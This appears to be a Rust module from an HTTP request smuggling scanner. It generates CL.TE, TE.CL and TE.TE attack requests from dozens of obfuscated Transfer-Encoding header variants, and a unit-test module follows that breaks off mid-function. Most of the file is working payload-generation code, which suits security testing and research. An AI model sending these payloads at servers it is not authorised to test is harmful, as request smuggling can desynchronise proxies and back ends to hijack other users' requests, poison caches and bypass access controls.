/// Helper function to format custom headers into a string
fn format_custom_headers(custom_headers: &[String]) -> String {
    if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    }
}

/// Helper function to format cookies into a Cookie header
fn format_cookies(cookies: &[String]) -> String {
    if cookies.is_empty() {
        String::new()
    } else {
        format!("Cookie: {}\r\n", cookies.join("; "))
    }
}

/// Generate Transfer-Encoding header variations for CL.TE and TE.CL attacks
/// Based on PortSwigger's http-request-smuggler patterns
fn get_te_header_variations() -> Vec<String> {
    let mut te_headers = vec![
        // === Basic vanilla variation ===
        "Transfer-Encoding: chunked".to_string(),
        // === Whitespace variations ===
        " Transfer-Encoding: chunked".to_string(), // Space prefix (nameprefix with space)
        "\tTransfer-Encoding: chunked".to_string(), // Tab prefix
        "Transfer-Encoding : chunked".to_string(), // Space before colon (space1)
        "Transfer-Encoding  : chunked".to_string(), // Double space before colon
        "Transfer-Encoding\t: chunked".to_string(), // Tab before colon
        "Transfer-Encoding:\tchunked".to_string(), // Tab after colon
        "Transfer-Encoding\t:\tchunked".to_string(), // Tab around colon
        "Transfer-Encoding:  chunked".to_string(), // Double space after colon
        "Transfer-Encoding:chunked".to_string(),   // No space after colon (nospace1)
        "Transfer-Encoding: chunked ".to_string(), // Trailing space
        "Transfer-Encoding: chunked\t".to_string(), // Trailing tab (tabsuffix)
        "Transfer-Encoding: chunked\r".to_string(), // CR suffix (0dsuffix)
        // === Line wrapping/folding variations (HTTP/1.1 obs-fold) ===
        "Transfer-Encoding:\n chunked".to_string(), // Newline + space (linewrapped1)
        "Transfer-Encoding:\r\n chunked".to_string(), // CRLF + space (line folding)
        "Transfer-Encoding:\r\n\tchunked".to_string(), // CRLF + tab (tabwrap)
        "Transfer-Encoding\r\n : chunked".to_string(), // CRLF before colon
        "Transfer-Encoding:\r\n \r\n chunked".to_string(), // Double wrapped (doublewrapped)
        "Foo: bar\r\n Transfer-Encoding: chunked".to_string(), // Line-folded after another header (nameprefix1)
        "Foo: bar\r\n\tTransfer-Encoding: chunked".to_string(), // Tab-prefixed after header (nameprefix2)
        // === Control character variations ===
        "Transfer-Encoding:\x0Bchunked".to_string(), // Vertical tab after colon
        "Transfer-Encoding: \x0Bchunked".to_string(), // Vertical tab in value (vertwrap)
        "Transfer-Encoding:\x0Cchunked".to_string(), // Form feed after colon
        "Transfer-Encoding: chunked\n\x0B".to_string(), // Vertical tab wrap after value
        // === Special prefix/suffix bytes ===
        "\x00Transfer-Encoding: chunked".to_string(), // Null byte prefix
        "Transfer-Encoding\x00: chunked".to_string(), // Null in header name
        "Transfer-Encoding: chunked\x00".to_string(), // Null suffix
        "\x7FTransfer-Encoding: chunked".to_string(), // DEL char prefix
        "Transfer-Encoding\x7F: chunked".to_string(), // DEL in header name
        // === Quote variations ===
        "Transfer-Encoding: \"chunked\"".to_string(), // Double quoted (quoted)
        "Transfer-Encoding: 'chunked'".to_string(),   // Single quoted (aposed)
        // === Multiple encoding values ===
        "Transfer-Encoding: chunked, identity".to_string(), // Comma-separated (commaCow)
        "Transfer-Encoding: identity, chunked".to_string(), // Reversed order (cowComma)
        "Transfer-Encoding: chunked,identity".to_string(),  // No space after comma
        "Transfer-Encoding: identity,chunked".to_string(),  // No space, reversed
        "Transfer-Encoding: chunked , identity".to_string(), // Spaces around comma
        "Transfer-Encoding: identity, chunked, identity".to_string(), // Nested encoding
        // === Header name variations ===
        "Transfer_Encoding: chunked".to_string(), // Underscore instead of hyphen (underjoin1)
        "Transfer Encoding: chunked".to_string(), // Space instead of hyphen (spacejoin1)
        "Transfer\\Encoding: chunked".to_string(), // Backslash instead of hyphen
        "Transfer\x00Encoding: chunked".to_string(), // Null in hyphen position
        // === Case variations ===
        "transfer-encoding: chunked".to_string(), // Lowercase
        "TRANSFER-ENCODING: chunked".to_string(), // Uppercase
        "TRANSFER-ENCODING: CHUNKED".to_string(), // All uppercase
        "tRaNsFeR-eNcOdInG: cHuNkEd".to_string(), // Mixed case (multiCase)
        "Transfer-encoding: chunked".to_string(), // First letter caps only
        // === Value variations ===
        "Transfer-Encoding: chunk".to_string(), // Truncated value (lazygrep)
        "Transfer-Encoding: CHUNKED".to_string(), // Uppercase value
        "Transfer-Encoding:  Chunked".to_string(), // Mixed case with extra space
        // === Bad line ending variations ===
        "Foo: bar\rTransfer-Encoding: chunked".to_string(), // CR only before TE (badsetupCR)
        "Foo: bar\nTransfer-Encoding: chunked".to_string(), // LF only before TE (badsetupLF)
        "Foo: bar\r\n\rTransfer-Encoding: chunked".to_string(), // Extra CR (0dwrap)
        // === CR injection variations ===
        "Tra\rnsfer-Encoding: chunked".to_string(), // CR in header name (0dspam)
        "Transfer-\rEncoding: chunked".to_string(), // CR after hyphen
        "Transfer-Encoding:\r chunked".to_string(), // CR + space after colon
        // === Junk/garbage variations ===
        "Transfer-Encoding x: chunked".to_string(), // Junk before colon (spjunk)
        "Transfer-Encoding: x chunked".to_string(), // Junk in value
        "X: y\r\nTransfer-Encoding: chunked".to_string(), // Preceded by junk header
        // === URL-encoded variations ===
        "Transfer-%45ncoding: chunked".to_string(), // URL-encoded E (encode)
        "Transfer-Encoding: %63hunked".to_string(), // URL-encoded c in value
        // === MIME encoding variations ===
        "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=".to_string(), // Base64 MIME (qencode)
        "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=".to_string(), // UTF-8 Base64 MIME (qencodeutf)
        // === HTTP/1.0 style ===
        "Transfer-Encoding: chunked".to_string(), // Standard for HTTP/1.0 test
    ];

    // Add extended ASCII variations (bytes > 0x7F) using String::from_utf8_lossy
    // These patterns are inspired by PortSwigger's nel, nbsp, shy, spaceFF, accentTE, accentCH
    let extended_ascii_patterns: Vec<String> = vec![
        // NEL character (0x85) - Next Line
        format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[0x85])
        ),
        // NBSP (0xA0) - Non-Breaking Space
        format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[0xA0])
        ),
        // Soft hyphen (0xAD) replacing hyphen
        format!(
            "Transfer{}Encoding: chunked",
            String::from_utf8_lossy(&[0xAD])
        ),
        // NBSP after colon
        format!(
            "Transfer-Encoding:{}chunked",
            String::from_utf8_lossy(&[0xA0])
        ),
        // High byte (0xFF) in value
        format!(
            "Transfer-Encoding: {}chunked",
            String::from_utf8_lossy(&[0xFF])
        ),
        // Accented character in name (0x82 - Latin Small Letter E with Acute in some encodings)
        format!(
            "Transf{}r-Encoding: chunked",
            String::from_utf8_lossy(&[0x82])
        ),
        // Accented character in value (0x96 - En Dash in some encodings)
        format!(
            "Transfer-Encoding: ch{}nked",
            String::from_utf8_lossy(&[0x96])
        ),
    ];
    te_headers.extend(extended_ascii_patterns);

    // Control character constants for header manipulation patterns
    // These are common control characters used in HTTP request smuggling attacks
    const NUL: u8 = 0x00; // Null byte - can cause early string termination in some parsers
    const TAB: u8 = 0x09; // Horizontal tab - valid HTTP whitespace
    const LF: u8 = 0x0A; // Line feed - HTTP line separator
    const VT: u8 = 0x0B; // Vertical tab - not valid HTTP whitespace, but sometimes accepted
    const FF: u8 = 0x0C; // Form feed - not valid HTTP whitespace, but sometimes accepted
    const CR: u8 = 0x0D; // Carriage return - HTTP line separator
    const SP: u8 = 0x20; // Space - valid HTTP whitespace
    const DEL: u8 = 0x7F; // Delete character - can cause parsing issues

    // Add whitespace prefix variations with common control characters
    // These test how parsers handle control characters before header names
    for ch in [NUL, TAB, LF, VT, FF, CR, SP, DEL].iter() {
        if *ch != TAB && *ch != SP {
            // Skip tab and space as they're already covered in basic variations
            te_headers.push(format!(
                "{}Transfer-Encoding: chunked",
                String::from_utf8_lossy(&[*ch])
            ));
        }
    }

    // Add suffix variations with control characters after the value
    // These test how parsers handle trailing control characters
    for ch in [NUL, TAB, VT, FF, DEL].iter() {
        te_headers.push(format!(
            "Transfer-Encoding: chunked{}",
            String::from_utf8_lossy(&[*ch])
        ));
    }

    // Add header name suffix variations (control character before colon)
    // These test how parsers handle control characters in header names
    for ch in [NUL, TAB, VT, FF, DEL].iter() {
        te_headers.push(format!(
            "Transfer-Encoding{}: chunked",
            String::from_utf8_lossy(&[*ch])
        ));
    }

    te_headers
}

/// Generate CL.TE (Content-Length vs Transfer-Encoding) attack payloads
pub fn get_cl_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::new();
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             {}\
             Content-Length: 6\r\n\
             {}\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            method, path, host, custom_header_str, cookie_str, te_header
        ));
    }
    payloads
}

/// Generate TE.CL (Transfer-Encoding vs Content-Length) attack payloads
pub fn get_te_cl_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::new();
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             {}\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, te_header
        ));
    }
    payloads
}

/// Generate TE.TE (Transfer-Encoding obfuscation) attack payloads
/// These payloads use two Transfer-Encoding headers to test for parser discrepancies
pub fn get_te_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let te_variations = vec![
        // === Basic dual header variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: cow"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: compress"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: deflate"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip"),
        // === Reversed dual chunk (revdualchunk) ===
        ("Transfer-Encoding: identity", "Transfer-Encoding: chunked"),
        // === Combined encodings ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: gzip, chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked, identity",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked",
        ),
        // === Nested encodings (nested) ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked, identity",
        ),
        // === Whitespace variations for second header ===
        ("Transfer-Encoding: chunked", " Transfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "\tTransfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding : chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:  chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:chunked"),
        // === Quote variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: \"chunked\"",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'"),
        // === Case variations ===
        ("Transfer-Encoding: chunked", "transfer-encoding: chunked"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: CHUNKED"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: chunked"),
        ("Transfer-Encoding: chunked", "TrAnSfEr-EnCoDiNg: ChUnKeD"),
        ("Transfer-Encoding: chunked", "Transfer-encoding: chunked"),
        // === Header name variations ===
        ("Transfer-Encoding: chunked", "Transfer_Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer\\Encoding: chunked"),
        // === Line folding variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\n chunked"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n\tchunked",
        ),
        // === Control character variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\x0Bchunked",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\t"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\x00",
        ),
        // === Truncated/lazygrep variation ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunk"),
        // === Bad setup line endings ===
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\rTransfer-Encoding: chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\nTransfer-Encoding: chunked",
        ),
        // === Content-Encoding confusion (contentEnc) ===
        ("Transfer-Encoding: chunked", "Content-Encoding: chunked"),
        // === URL-encoded variations ===
        ("Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked"),
        // === Connection header combination ===
        (
            "Transfer-Encoding: chunked",
            "Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked",
        ),
    ];

    // Add extended ASCII variations for TE.TE (bytes > 0x7F)
    let extended_te_te_variations: Vec<(String, String)> = vec![
        // NEL character (0x85)
        (
            "Transfer-Encoding: chunked".to_string(),
            format!(
                "Transfer-Encoding{}: chunked",
                String::from_utf8_lossy(&[0x85])
            ),
        ),
        // NBSP (0xA0)
        (
            "Transfer-Encoding: chunked".to_string(),
            format!(
                "Transfer-Encoding{}: chunked",
                String::from_utf8_lossy(&[0xA0])
            ),
        ),
    ];

    let mut payloads = Vec::new();
    for (te1, te2) in te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, cookie_str, te1, te2
        ));
    }

    // Add extended ASCII variations
    for (te1, te2) in extended_te_te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, cookie_str, te1, te2
        ));
    }

    payloads
}

/// Helper function to check if a payload contains a Transfer-Encoding related header
/// This handles various obfuscation techniques including control characters in header names
fn contains_te_header_pattern(payload: &str) -> bool {
    let payload_lower = payload.to_lowercase();

    // Standard patterns (most reliable)
    if payload_lower.contains("transfer-encoding") ||
       payload_lower.contains("transfer_encoding") ||  // underjoin pattern
       payload_lower.contains("transfer encoding") ||  // spacejoin pattern
       payload_lower.contains("transfer\\encoding") || // backslash pattern
       payload_lower.contains("content-encoding")
    {
        // Content-Encoding confusion
        return true;
    }

    // URL-encoded patterns
    if payload_lower.contains("transfer%") || payload_lower.contains("=?") {
        return true;
    }

    // Partial patterns for control character obfuscation
    // These catch cases where control chars (CR, null, etc.) are inserted into header names
    if payload_lower.contains("nsfer-encoding") || // Handles CR in "Tra\rnsfer-Encoding"
       payload_lower.contains("encoding: chunked") ||
       payload_lower.contains("encoding:chunked") ||
       payload_lower.contains("encoding:\tchunked")
    {
        return true;
    }

    // Check for "chunked" value which should appear in all TE headers
    if payload_lower.contains("chunked") {
        // Also verify there's some encoding-related text nearby
        if payload_lower.contains("encoding")
            || payload_lower.contains("encod")
            || payload_lower.contains("transf")
        {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    //! Tests for HTTP request smuggling payload generation
    //! 
    //! This module contains comprehensive tests for:
    //! - CL.TE (Content-Length vs Transfer-Encoding) payload generation
    //! - TE.CL (Transfer-Encoding vs Content-Length) payload generation
    //! - TE.TE (Transfer-Encoding obfuscation) payload generation
    //! - Transfer-Encoding header variations and mutations
    //! - PortSwigger http-request-smuggler pattern compatibility
    //! - Custom headers and cookies formatting
    //! - Payload structure and HTTP compliance

    use super::*;
    use crate::model::CheckResult;

    // Test helper functions to expose private functions for testing
    pub(crate) fn format_custom_headers_test_helper(custom_headers: &[String]) -> String {
        format_custom_headers(custom_headers)
    }

    pub(crate) fn format_cookies_test_helper(cookies: &[String]) -> String {
        format_cookies(cookies)
    }

    #[test]
    fn test_cl_te_payloads_generation() {
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[], &[]);
        assert!(!payloads.is_empty());
        // Updated to reflect extended mutations from PortSwigger http-request-smuggler
        assert!(
            payloads.len() >= 50,
            "Expected at least 50 payloads, got {}",
            payloads.len()
        );

        // Check that all payloads contain required components
        for (i, payload) in payloads.iter().enumerate() {
            assert!(
                payload.contains("Content-Length: 6"),
                "Payload {} missing Content-Length",
                i
            );
            // Use helper function to check for Transfer-Encoding header patterns
            assert!(
                contains_te_header_pattern(payload),
                "Payload {} should contain some form of Transfer-Encoding header. First 200 chars: {}",
                i,
                &payload[..std::cmp::min(200, payload.len())]
            );
            assert!(payload.contains("POST /test HTTP/1.1"));
            assert!(payload.contains("Host: example.com"));
        }
    }

    #[test]
    fn test_te_cl_payloads_generation() {
        let payloads = get_te_cl_payloads("/api", "target.com", "GET", &[], &[]);
        assert!(!payloads.is_empty());
        // Updated to reflect extended mutations from PortSwigger http-request-smuggler
        assert!(
            payloads.len() >= 50,
            "Expected at least 50 payloads, got {}",
            payloads.len()
        );

        for (i, payload) in payloads.iter().enumerate() {
            assert!(payload.contains("Content-Length: 4"));
            // Use helper function to check for Transfer-Encoding header patterns
            assert!(
                contains_te_header_pattern(payload),
                "Payload {} should contain some form of Transfer-Encoding header",
                i
            );
            assert!(payload.contains("GET /api HTTP/1.1"));
        }
    }

    #[test]
    fn test_te_te_payloads_generation() {
        let payloads = get_te_te_payloads("/", "site.com", "POST", &[], &[]);
        assert!(!payloads.is_empty());
        // Updated to reflect extended mutations from PortSwigger http-request-smuggler
        assert!(
            payloads.len() >= 40,
            "Expected at least 40 payloads, got {}",
            payloads.len()
        );

        for payload in &payloads {
            // Check for at least one Transfer-Encoding header (case insensitive)
            let payload_lower = payload.to_lowercase();
            assert!(
                payload_lower.contains("transfer-encoding")
                    || payload_lower.contains("transfer_encoding")
                    || payload_lower.contains("content-encoding"),
                "Payload should contain some form of Transfer-Encoding or Content-Encoding header"
            );
            assert!(payload.contains("POST / HTTP/1.1"));
        }
    }

    #[test]
    fn test_custom_headers_integration() {
        let custom_headers = vec![
            "X-Custom-Header: value1".to_string(),
            "Authorization: Bearer token".to_string(),
        ];

        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &custom_headers, &[]);

        for payload in &payloads {
            assert!(payload.contains("X-Custom-Header: value1"));
            assert!(payload.contains("Authorization: Bearer token"));
        }
    }

    #[test]
    fn test_check_result_serialization() {
        let result = CheckResult {
            check_type: "CL.TE".to_string(),
            vulnerable: false,
            payload_index: None,
            normal_status: "HTTP/1.1 200 OK".to_string(),
            attack_status: None,
            normal_duration_ms: 150,
            attack_duration_ms: None,
            timestamp: "2024-01-01T12:00:00Z".to_string(),
            payload: None,
        };

        let json = serde_json::to_string(&result);
        assert!(json.is_ok());

        let deserialized: Result<CheckResult, _> = serde_json::from_str(&json.unwrap());
        assert!(deserialized.is_ok());
    }

    #[test]
    fn test_cl_te_payload_structure() {
        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[], &[]);
        let payload = &payloads[0];

        // Check for proper HTTP request structure
        assert!(payload.starts_with("POST / HTTP/1.1\r\n"));
        assert!(payload.contains("Host: example.com\r\n"));
        assert!(payload.contains("Connection: keep-alive\r\n"));
        assert!(payload.contains("Content-Length: 6"));
        assert!(payload.contains("Transfer-Encoding: chunked"));

        // Check for chunked encoding format
        assert!(payload.contains("0\r\n"));
    }

    #[test]
    fn test_te_cl_payload_structure() {
        let payloads = get_te_cl_payloads("/api/test", "target.com", "GET", &[], &[]);
        let payload = &payloads[0];

        assert!(payload.starts_with("GET /api/test HTTP/1.1\r\n"));
        assert!(payload.contains("Host: target.com"));
        assert!(payload.contains("Content-Length: 4"));
        assert!(payload.contains("Transfer-Encoding: chunked"));

        // Check for chunked encoding format
        assert!(payload.contains("1\r\n"));
        assert!(payload.contains("A\r\n"));
        assert!(payload.contains("0\r\n"));
    }

    #[test]
    fn test_te_te_payload_structure() {
        let payloads = get_te_te_payloads("/test", "site.com", "POST", &[], &[]);
        let payload = &payloads[0];

        assert!(payload.starts_with("POST /test HTTP/1.1\r\n"));
        assert!(payload.contains("Host: site.com"));
        assert!(payload.contains("Content-Length: 4"));

        // Should have two Transfer-Encoding headers
        let te_count = payload.matches("Transfer-Encoding:").count();
        assert_eq!(te_count, 2);
    }

    #[test]
    fn test_transfer_encoding_variations_cl_te() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // Should have many variations now - at least 50 from PortSwigger patterns
        assert!(
            payloads.len() >= 50,
            "Expected at least 50 variations, got {}",
            payloads.len()
        );

        // Check for at least the basic variations
        let has_basic = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked\r\n"));
        let has_space_prefix = payloads
            .iter()
            .any(|p| p.contains(" Transfer-Encoding: chunked"));
        let has_space_before_colon = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding : chunked"));
        let has_tab = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding:\tchunked"));
        let has_underscore = payloads
            .iter()
            .any(|p| p.contains("Transfer_Encoding: chunked"));
        let has_quoted = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: \"chunked\""));
        let has_lowercase = payloads
            .iter()
            .any(|p| p.contains("transfer-encoding: chunked"));

        assert!(has_basic, "Missing basic Transfer-Encoding header");
        assert!(has_space_prefix, "Missing space prefix variation");
        assert!(
            has_space_before_colon,
            "Missing space before colon variation"
        );
        assert!(has_tab, "Missing tab variation");
        assert!(has_underscore, "Missing underscore variation (underjoin1)");
        assert!(has_quoted, "Missing quoted variation");
        assert!(has_lowercase, "Missing lowercase variation");
    }

    #[test]
    fn test_transfer_encoding_variations_te_cl() {
        let payloads = get_te_cl_payloads("/", "test.com", "POST", &[], &[]);

        // Should have many variations now - at least 50 from PortSwigger patterns
        assert!(
            payloads.len() >= 50,
            "Expected at least 50 variations, got {}",
            payloads.len()
        );

        // Verify some basic variations are present
        let has_basic = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked\r\n"));
        let has_space_prefix = payloads
            .iter()
            .any(|p| p.contains(" Transfer-Encoding: chunked"));
        let has_underscore = payloads
            .iter()
            .any(|p| p.contains("Transfer_Encoding: chunked"));

        assert!(has_basic, "Missing basic variation");
        assert!(has_space_prefix, "Missing space prefix variation");
        assert!(has_underscore, "Missing underscore variation (underjoin1)");
    }

    #[test]
    fn test_te_te_dual_encoding_variations() {
        let payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);

        // Should have many variations now - at least 40 from PortSwigger patterns
        assert!(
            payloads.len() >= 40,
            "Expected at least 40 variations, got {}",
            payloads.len()
        );

        // Check some specific variations exist
        let has_x_custom = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: x-custom"));
        let has_identity = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: identity"));
        let has_cow = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: cow"));
        let has_content_encoding = payloads
            .iter()
            .any(|p| p.contains("Content-Encoding: chunked"));

        assert!(has_x_custom, "Missing x-custom variation");
        assert!(has_identity, "Missing identity variation");
        assert!(has_cow, "Missing cow variation");
        assert!(
            has_content_encoding,
            "Missing Content-Encoding confusion variation"
        );

        // Most payloads should have at least two header-related entries (case insensitive)
        // Some payloads with extended ASCII may have fewer due to encoding issues
        let mut count_with_two_headers = 0;
        for payload in &payloads {
            let payload_lower = payload.to_lowercase();
            let te_count = payload_lower.matches("transfer-encoding").count();
            let ce_count = payload_lower.matches("content-encoding").count();
            let connection_te = if payload_lower.contains("connection: transfer-encoding") {
                1
            } else {
                0
            };
            let total_count = te_count + ce_count + connection_te;
            if total_count >= 2 {
                count_with_two_headers += 1;
            }
        }
        // At least 90% of payloads should have 2+ TE/CE headers
        let ratio = count_with_two_headers as f64 / payloads.len() as f64;
        assert!(
            ratio >= 0.9,
            "Expected at least 90% of payloads to have 2+ TE/CE headers, got {}%",
            ratio * 100.0
        );
    }

    #[test]
    fn test_custom_headers_placement() {
        let custom_headers = vec![
            "X-API-Key: secret123".to_string(),
            "User-Agent: TestAgent/1.0".to_string(),
        ];

        let payload = &get_cl_te_payloads("/", "example.com", "POST", &custom_headers, &[])[0];

        // Custom headers should be present
        assert!(payload.contains("X-API-Key: secret123"));
        assert!(payload.contains("User-Agent: TestAgent/1.0"));

        // Should appear before Content-Length (standard ordering)
        let custom_pos = payload.find("X-API-Key").unwrap();
        let cl_pos = payload.find("Content-Length").unwrap();
        assert!(custom_pos < cl_pos);
    }

    #[test]
    fn test_empty_custom_headers() {
        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[], &[]);

        // Should not have extra empty lines from custom headers
        for payload in &payloads {
            // Count consecutive \n characters - should not have more than expected
            assert!(!payload.contains("\n\n\n"));
        }
    }

    #[test]
    fn test_different_methods() {
        let methods = vec!["GET", "POST", "PUT", "DELETE", "PATCH"];

        for method in methods {
            let payloads = get_cl_te_payloads("/api", "test.com", method, &[], &[]);
            for payload in &payloads {
                assert!(payload.starts_with(&format!("{} /api HTTP/1.1", method)));
            }
        }
    }

    #[test]
    fn test_different_paths() {
        let paths = vec!["/", "/api", "/api/v1/users", "/test?param=value"];

        for path in paths {
            let payloads = get_te_cl_payloads(path, "test.com", "POST", &[], &[]);
            for payload in &payloads {
                assert!(payload.contains(&format!("POST {} HTTP/1.1", path)));
            }
        }
    }

    #[test]
    fn test_different_hosts() {
        let hosts = vec!["example.com", "api.example.com", "192.168.1.1", "localhost"];

        for host in hosts {
            let payloads = get_te_te_payloads("/", host, "POST", &[], &[]);
            for payload in &payloads {
                assert!(payload.contains(&format!("Host: {}", host)));
            }
        }
    }

    #[test]
    fn test_payload_http_compliance() {
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[], &[]);

        for payload in &payloads {
            // Each line should end with \r\n
            let lines: Vec<&str> = payload.split("\r\n").collect();

            // Should have HTTP version in first line
            assert!(lines[0].contains("HTTP/1.1"));

            // Should have proper header format (key: value)
            let has_host = lines.iter().any(|line| line.starts_with("Host:"));
            assert!(has_host, "Missing Host header");

            let has_connection = lines.iter().any(|line| line.starts_with("Connection:"));
            assert!(has_connection, "Missing Connection header");
        }
    }

    #[test]
    fn test_chunked_encoding_format() {
        let payloads = get_te_cl_payloads("/", "test.com", "GET", &[], &[]);

        for payload in &payloads {
            // Should contain chunk size "1" followed by chunk data "A"
            assert!(payload.contains("1\r\n"));
            assert!(payload.contains("A\r\n"));
            // Should end with zero chunk
            assert!(payload.contains("0\r\n"));
        }
    }

    #[test]
    fn test_content_length_values() {
        let cl_te_payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        for payload in &cl_te_payloads {
            assert!(payload.contains("Content-Length: 6"));
        }

        let te_cl_payloads = get_te_cl_payloads("/", "test.com", "POST", &[], &[]);
        for payload in &te_cl_payloads {
            assert!(payload.contains("Content-Length: 4"));
        }

        let te_te_payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);
        for payload in &te_te_payloads {
            assert!(payload.contains("Content-Length: 4"));
        }
    }

    // ========== New tests for PortSwigger http-request-smuggler patterns ==========

    #[test]
    fn test_portswigger_underjoin_pattern() {
        // Test that underscore variation (underjoin1) is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_underscore = payloads
            .iter()
            .any(|p| p.contains("Transfer_Encoding: chunked"));
        assert!(
            has_underscore,
            "Missing Transfer_Encoding (underjoin1) pattern"
        );
    }

    #[test]
    fn test_portswigger_spacejoin_pattern() {
        // Test that space-in-name variation (spacejoin1) is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_space_join = payloads
            .iter()
            .any(|p| p.contains("Transfer Encoding: chunked"));
        assert!(
            has_space_join,
            "Missing Transfer Encoding (spacejoin1) pattern"
        );
    }

    #[test]
    fn test_portswigger_nospace_pattern() {
        // Test that no-space-after-colon variation (nospace1) is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_nospace = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding:chunked"));
        assert!(
            has_nospace,
            "Missing Transfer-Encoding:chunked (nospace1) pattern"
        );
    }

    #[test]
    fn test_portswigger_linewrapped_pattern() {
        // Test that line-wrapped variation is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_linewrap = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding:\n chunked"));
        assert!(has_linewrap, "Missing line-wrapped pattern");
    }

    #[test]
    fn test_portswigger_vertwrap_pattern() {
        // Test that vertical tab wrap variation is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_vertwrap = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding:\x0Bchunked"));
        assert!(has_vertwrap, "Missing vertical tab variation");
    }

    #[test]
    fn test_portswigger_case_variations() {
